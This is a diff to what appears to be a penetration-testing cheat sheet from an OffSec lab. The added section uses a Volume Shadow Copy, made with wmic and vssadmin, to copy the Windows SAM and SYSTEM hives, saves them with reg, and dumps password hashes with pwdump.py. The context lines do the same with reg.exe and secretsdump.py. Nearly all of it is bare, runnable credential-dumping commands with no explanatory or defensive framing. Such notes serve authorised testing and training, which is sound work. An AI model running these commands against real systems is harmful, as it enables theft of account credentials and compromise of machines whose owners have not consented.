@@ -22,3 +22,14 @@ C:\> reg.exe save hklm\security c:\temp\security.save
 C:\> reg.exe save hklm\system c:\temp\system.save
 
 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+[Volume Shadow Copy]
+
+wmic shadowcopy call create Volume='C:\'
+vssadmin list shadows
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
+reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
+reg save HKLM\system C:\users\offsec.corp1\Downloads\system
+python pwdump.py /home/kali/system /home/kali/sam
+
